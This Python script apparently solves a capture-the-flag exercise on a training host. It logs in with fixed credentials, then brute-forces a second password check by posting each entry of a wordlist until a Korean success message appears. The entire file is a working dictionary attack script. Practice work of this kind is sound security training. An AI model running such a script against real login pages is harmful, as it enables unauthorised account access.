import requests

login_url = "http://ctf.segfaulthub.com:5004/study/login_ok.php"
mypage_url = "http://ctf.segfaulthub.com:5004/study/mypage_check.php"

login_payloads = {"user_id": "process", "user_pw": "1234"}
session = requests.Session()
resp = session.post(login_url, data=login_payloads)
result = resp.text.find("로그인에 성공했습니다!")
if result > 0:
    print("login Success")

with open("wordlist.txt", "r") as f:
    lines = f.readlines()
    for line in lines:
        line = line.strip()
        attack_payloads = {"pw": line}
        resp = session.post(mypage_url, data=attack_payloads)

        result = resp.text.find("마이페이지에 접근합니다.")
        if result > 0:
            print(f"attack Success, password is [{line}]")
            break
        else:
            print(f"attack Fail : {line}")
